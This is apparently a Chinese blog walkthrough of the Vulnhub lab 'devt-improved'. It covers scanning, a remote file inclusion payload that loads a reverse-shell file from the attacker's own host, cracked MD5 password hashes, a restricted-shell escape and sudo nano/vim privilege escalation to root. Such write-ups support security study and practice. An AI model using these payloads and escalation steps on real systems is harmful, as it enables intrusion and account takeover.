---
title: Vulnhub-devt-improved 
date: 2024-03-23  
categories: [Training platform,Vulnhub]  
tags: [Vulnhub,web]  
permalink: "/Vulnhub/devt-improved.html"
---

# devt-improved

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403232024726.png" alt="image-20240323183815219" style="zoom:33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403232024728.png" alt="image-20240323184903961" style="zoom: 67%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403232024729.png" alt="image-20240323184931919" style="zoom:50%;" />

看来没错了

## 信息搜集

### 端口扫描

```bash
rustscan -a 192.168.37.131 -- -A -sC -sV 
```

```apl
Open 192.168.37.131:22
Open 192.168.37.131:113
Open 192.168.37.131:139
Open 192.168.37.131:445
Open 192.168.37.131:8080
```

```text
PORT     STATE SERVICE     REASON  VERSION
22/tcp   open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 79:07:2b:2c:2c:4e:14:0a:e7:b3:63:46:c6:b3:ad:16 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/0O8beKKMGvekLefDRWa/MVhJwXr1B0PuQHDt8xlqKcpvdLCO6b0c+sfcemEq7m92V82fTy2BAvvkk9GZSQ+OrDfWzB1grIl6t9ndVBB++rz/rZBwmZ/VcSBLSwjRAnrHRiyCtunxDiWYwD2htq5FV2r4K38+YrWARqpapME/K/atz9Txxe4WwzihPB+910b0dG4JAn8hXG8VHZsJvo4qV0/yEcSgwD9B4QV6XK3uxOnHviWUEJTOHU12LAz39KYj5Pir9BmSsfrbDgt4s06zR1RqviIF+GIJkbeWR5V5Mn9CazLuPmyrmybsFEfFMh5VeDJ33eCeGLhmHYoGEJ6p
|   256 c2:b6:8c:36:a6:dd:9b:17:bb:4f:0e:0f:16:89:d6:4b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ8C4BDQAOCp2TfWnvOmYyiiiYDe5ub2+NvCAkNWcXgavJtZUsBxXlTLhGWk2omUZtQCq4Tnb+BymEvKz8IKYXk=
|   256 24:6b:85:e3:ab:90:5c:ec:d5:83:49:54:cd:98:31:95 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILvQyP65/4gxE9tbpAIijwT4kwjUtquJDVqd3+iNB0pN
113/tcp  open  ident?      syn-ack
|_auth-owners: oident
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
|_auth-owners: root
445/tcp  open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
|_auth-owners: root
8080/tcp open  http-proxy  syn-ack IIS 6.0
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: IIS 6.0
|_http-title: DEVELOPMENT PORTAL. NOT FOR OUTSIDERS OR HACKERS!
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sat, 23 Mar 2024 10:50:55 GMT
|     Server: IIS 6.0
|     Last-Modified: Wed, 26 Dec 2018 01:55:41 GMT
|     ETag: "230-57de32091ad69"
|     Accept-Ranges: bytes
|     Content-Length: 560
|     Vary: Accept-Encoding
|     Connection: close
|     Content-Type: text/html
|     <html>
|     <head><title>DEVELOPMENT PORTAL. NOT FOR OUTSIDERS OR HACKERS!</title>
|     </head>
|     <body>
|     <p>Welcome to the Development Page.</p>
|     <br/>
|     <p>There are many projects in this box. View some of these projects at html_pages.</p>
|     <br/>
|     <p>WARNING! We are experimenting a host-based intrusion detection system. Report all false positives to patrick@goodtech.com.sg.</p>
|     <br/>
|     <br/>
|     <br/>
|     <hr>
|     <i>Powered by IIS 6.0</i>
|     </body>
|     <!-- Searching for development secret page... where could it be? -->
|     <!-- Patrick, Head of Development-->
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sat, 23 Mar 2024 10:50:55 GMT
|     Server: IIS 6.0
|     Allow: GET,POST,OPTIONS,HEAD
|     Content-Length: 0
|     Connection: close
|     Content-Type: text/html
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Date: Sat, 23 Mar 2024 10:50:55 GMT
|     Server: IIS 6.0
|     Content-Length: 293
|     Connection: close
|     Content-Type: text/html; charset=iso-8859-1
|     <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
|     <html><head>
|     <title>400 Bad Request</title>
|     </head><body>
|     <h1>Bad Request</h1>
|     <p>Your browser sent a request that this server could not understand.<br />
|     </p>
|     <hr>
|     <address>IIS 6.0 Server at 192.168.37.131 Port 8080</address>
|_    </body></html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=3/23%Time=65FEB40E%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,330,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2023\x20Mar\x
SF:202024\x2010:50:55\x20GMT\r\nServer:\x20IIS\x206\.0\r\nLast-Modified:\x
SF:20Wed,\x2026\x20Dec\x202018\x2001:55:41\x20GMT\r\nETag:\x20\"230-57de32
SF:091ad69\"\r\nAccept-Ranges:\x20bytes\r\nContent-Length:\x20560\r\nVary:
SF:\x20Accept-Encoding\r\nConnection:\x20close\r\nContent-Type:\x20text/ht
SF:ml\r\n\r\n<html>\r\n<head><title>DEVELOPMENT\x20PORTAL\.\x20NOT\x20FOR\
SF:x20OUTSIDERS\x20OR\x20HACKERS!</title>\r\n</head>\r\n<body>\r\n<p>Welco
SF:me\x20to\x20the\x20Development\x20Page\.</p>\r\n<br/>\r\n<p>There\x20ar
SF:e\x20many\x20projects\x20in\x20this\x20box\.\x20View\x20some\x20of\x20t
SF:hese\x20projects\x20at\x20html_pages\.</p>\r\n<br/>\r\n<p>WARNING!\x20W
SF:e\x20are\x20experimenting\x20a\x20host-based\x20intrusion\x20detection\
SF:x20system\.\x20Report\x20all\x20false\x20positives\x20to\x20patrick@goo
SF:dtech\.com\.sg\.</p>\r\n<br/>\r\n<br/>\r\n<br/>\r\n<hr>\r\n<i>Powered\x
SF:20by\x20IIS\x206\.0</i>\r\n</body>\r\n\r\n<!--\x20Searching\x20for\x20d
SF:evelopment\x20secret\x20page\.\.\.\x20where\x20could\x20it\x20be\?\x20-
SF:->\r\n\r\n<!--\x20Patrick,\x20Head\x20of\x20Development-->\r\n\r\n</htm
SF:l>\r\n")%r(HTTPOptions,A6,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x202
SF:3\x20Mar\x202024\x2010:50:55\x20GMT\r\nServer:\x20IIS\x206\.0\r\nAllow:
SF:\x20GET,POST,OPTIONS,HEAD\r\nContent-Length:\x200\r\nConnection:\x20clo
SF:se\r\nContent-Type:\x20text/html\r\n\r\n")%r(RTSPRequest,1CC,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nDate:\x20Sat,\x2023\x20Mar\x202024\x2010:5
SF:0:55\x20GMT\r\nServer:\x20IIS\x206\.0\r\nContent-Length:\x20293\r\nConn
SF:ection:\x20close\r\nContent-Type:\x20text/html;\x20charset=iso-8859-1\r
SF:\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//IETF//DTD\x20HTML\x202\.0//EN
SF:\">\n<html><head>\n<title>400\x20Bad\x20Request</title>\n</head><body>\
SF:n<h1>Bad\x20Request</h1>\n<p>Your\x20browser\x20sent\x20a\x20request\x2
SF:0that\x20this\x20server\x20could\x20not\x20understand\.<br\x20/>\n</p>\
SF:n<hr>\n<address>IIS\x206\.0\x20Server\x20at\x20192\.168\.37\.131\x20Por
SF:t\x208080</address>\n</body></html>\n");
Service Info: Host: DEVELOPMENT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: development
|   NetBIOS computer name: DEVELOPMENT\x00
|   Domain name: \x00
|   FQDN: development
|_  System time: 2024-03-23T10:52:25+00:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 33014/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 62492/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 23242/udp): CLEAN (Failed to receive data)
|   Check 4 (port 17670/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: DEVELOPMENT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   DEVELOPMENT<00>      Flags: <unique><active>
|   DEVELOPMENT<03>      Flags: <unique><active>
|   DEVELOPMENT<20>      Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb2-time: 
|   date: 2024-03-23T10:52:25
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
```

### 目录扫描

没开 80 端口，但是开了 8080 端口，尝试扫描。

```bash
feroxbuster -u http://192.168.37.131:8080
```

```text
403      GET       11l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        5l        4w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      316c http://192.168.37.131:8080/aspnet_client => http://192.168.37.131:8080/aspnet_client/
200      GET        1l        5w       29c http://192.168.37.131:8080/error
200      GET       13l       23w      154c http://192.168.37.131:8080/_vti_cnf
200      GET       30l       99w      936c http://192.168.37.131:8080/about
200      GET       13l       23w      154c http://192.168.37.131:8080/_vti_pvt
200      GET       13l       23w      154c http://192.168.37.131:8080/_vti_bin
200      GET        9l       94w      576c http://192.168.37.131:8080/development
200      GET        6l       13w      144c http://192.168.37.131:8080/root
200      GET       21l       72w      560c http://192.168.37.131:8080/
[#>------------------] - 77s     3080/60004   23m     found:9       errors:919    
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_192_168_37_131:8080-1711191937.state ...
[#>------------------] - 77s     3080/60004   23m     found:9       errors:919    
[#>------------------] - 77s     2660/30000   34/s    http://192.168.37.131:8080/ 
[####################] - 0s     30000/30000   2727273/s http://192.168.37.131:8080/aspnet_client/ => Directory listing
[####################] - 5s     30000/30000   6014/s  http://192.168.37.131:8080/aspnet_client/system_web/ => Directory listing
[>-------------------] - 68s      399/30000   6/s     http://192.168.37.131:8080/aspnet_client/system_web/4_0_30319/    
```

不知道为啥，一扫描端口就全关掉了，可能做了防护措施，重启靶场不扫描了。

## 漏洞挖掘

### SMB服务探测

```bash
smbmap -H 192.168.37.131
```

```text
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 192.168.37.131:445      Name: 192.168.37.131            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        access                                                  NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (development server (Samba, Ubuntu))
```

没有权限。

### 查看敏感目录

![image-20240323191344493](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403232024730.png)

```text
// http://192.168.37.131:8080/html_pages
-rw-r--r-- 1 www-data www-data      285 Sep 26 17:46 about.html
-rw-r--r-- 1 www-data www-data     1049 Sep 26 17:51 config.html
-rw-r--r-- 1 www-data www-data      199 Jul 23 15:37 default.html
-rw-r--r-- 1 www-data www-data     1086 Sep 28 09:22 development.html
-rw-r--r-- 1 www-data www-data      446 Jun 14 01:37 downloads.html
-rw-r--r-- 1 www-data www-data      285 Sep 26 17:53 error.html
-rw-r--r-- 1 www-data www-data        0 Sep 28 09:23 html_pages
-rw-r--r-- 1 www-data www-data      751 Sep 28 09:22 index.html
-rw-r--r-- 1 www-data www-data      202 Sep 26 17:57 login.html
-rw-r--r-- 1 www-data www-data      682 Jul 23 15:36 register.html
-rw-r--r-- 1 www-data www-data       74 Jul 23 16:29 tryharder.html
-rw-r--r-- 1 www-data www-data      186 Sep 26 17:58 uploads.html
```

依次看一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403232024731.png" alt="image-20240323191516055" style="zoom: 33%;" />

![image-20240323191654701](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403232024732.png)

### 追踪数据流文件

打开看一下那个数据流文件。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403232024733.png" alt="image-20240323191853427" style="zoom: 33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403232024734.png" alt="image-20240323192405539" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403232024735.png" alt="image-20240323192513145" style="zoom: 33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403232024736.png" alt="image-20240323192725808" style="zoom:50%;" />

### 子目录爆破

一个一个搜索太慢了，再扫一下吧，把线程调低一点。

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.37.131:8080/developmentsecretpage/ -f -t 10 -x html,php,txt,zip,jpg,png
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403232024737.png" alt="image-20240323193119139" style="zoom:50%;" />

还是出现了这种事情。。。。

再调小一点：

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.37.131:8080/developmentsecretpage/  -t 5 -x html,php,txt,zip
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403232024738.png" alt="image-20240323193409792" style="zoom:50%;" />

看来确实不是通过扫描得到东西的。。。。

回头找办法的时候才发现在8080端口就暗示了可能启动了`HIDS`。

> HIDS全称是Host-based Intrusion Detection System，即基于主机型入侵检测系统。作为计算机系统的监视器和分析器，它并不作用于外部接口，而是专注于系统内部，监视系统全部或部分的动态的行为以及整个计算机系统的状态。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403232024739.png" alt="image-20240323193755317" style="zoom:50%;" />

发现了一个登录界面！

尝试弱密码以及万能密码，发现报错了：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403232024740.png" alt="image-20240323193921472" style="zoom:50%;" />

查找一下这个报错信息：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403232024741.png" alt="image-20240323194231466" style="zoom: 33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403232024742.png" alt="image-20240323194254823" style="zoom:50%;" />

尝试它的payload:

```bash
/[path]/slogin_lib.inc.php?slogin_path=[remote_txt_shell]
/[path]/slog_users.txt
```

```text
http://192.168.37.131:8080/developmentsecretpage/slogin_lib.inc.php?slogin_path=http://192.168.37.128:8888/reverseShell.php
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403232024743.png" alt="image-20240323194903982" style="zoom:50%;" />

第一个失败了，继续尝试。

```text
http://192.168.37.131:8080/developmentsecretpage/slog_users.txt
```

```apl
admin, 3cb1d13bb83ffff2defe8d1443d3a0eb
intern, 4a8a2b374f463b7aedbb44a066363b81
patrick, 87e6d56ce79af90dbe07d387d3d0579e
qiu, ee64497098d0926d198f54f6d5431f98
```

进行 md5 解密：

```apl
admin 		
intern		12345678900987654321
patrick		P@ssw0rd25
qiu			qiu
```

尝试ssh登录。

```bash
ssh intern@192.168.37.131
```

出现了以下报错：

```text
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that a host key has just been changed.
The fingerprint for the ED25519 key sent by the remote host is
SHA256:gCZ6+ixH4Qe19wr8iDYUTaofDOf16k4ccCQ68NZ08yM.
Please contact your system administrator.
Add correct host key in /home/kali/.ssh/known_hosts to get rid of this message.
Offending ECDSA key in /home/kali/.ssh/known_hosts:33
  remove with:
  ssh-keygen -f '/home/kali/.ssh/known_hosts' -R '192.168.37.131'
Host key for 192.168.37.131 has changed and you have requested strict checking.
Host key verification failed.
```

是因为之前有个靶场域名和这个一模一样，所以存下来了，使用命令`ssh-keygen -f '/home/kali/.ssh/known_hosts' -R '192.168.37.131'`删掉就行了。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403232024744.png" alt="image-20240323201323393" style="zoom: 50%;" />

## 提权

### 扩展一下

虽然连接上了，但是是一个受限用户：

```bash
intern:~$ ?
cd  clear  echo  exit  help  ll  lpath  ls
```

尝试切换，看看能不能扩展一下。

```bash
intern:~$ echo os.system("/bin/bash")
intern@development:~$ whoami;id
intern
uid=1002(intern) gid=1006(intern) groups=1006(intern)
intern@development:~$ ls
access  local.txt  work.txt
intern@development:~$ cat local.txt
Congratulations on obtaining a user shell. :)
intern@development:~$ cat work.txt
1.      Tell Patrick that shoutbox is not working. We need to revert to the old method to update David about shoutbox. For new, we will use the old director's landing page.

2.      Patrick's start of the third year in this company!

3.      Attend the meeting to discuss if password policy should be relooked at.
intern@development:~$ sudo -l
[sudo] password for intern: 
Sorry, user intern may not run sudo on development.
```

### 切换用户

```bash
intern@development:~$ su patrick
Password: 
patrick@development:/home/intern$ whoami
patrick
patrick@development:/home/intern$ id
uid=1001(patrick) gid=1005(patrick) groups=1005(patrick),108(lxd)
patrick@development:/home/intern$ sudo -l
Matching Defaults entries for patrick on development:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User patrick may run the following commands on development:
    (ALL) NOPASSWD: /usr/bin/vim
    (ALL) NOPASSWD: /bin/nano
```

### vim提权

https://gtfobins.github.io/gtfobins/vim/

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403232024745.png" alt="image-20240323202013469" style="zoom: 50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403232024747.png" alt="image-20240323202106017" style="zoom:50%;" />

### nano提权

https://gtfobins.github.io/gtfobins/nano/

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403232024748.png" alt="image-20240323202157480" style="zoom:50%;" />

```bash
sudo nano
ctrl+r ctrl+x
reset; sh 1>&0 2>&0
```

![image-20240323202356523](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403232024749.png)
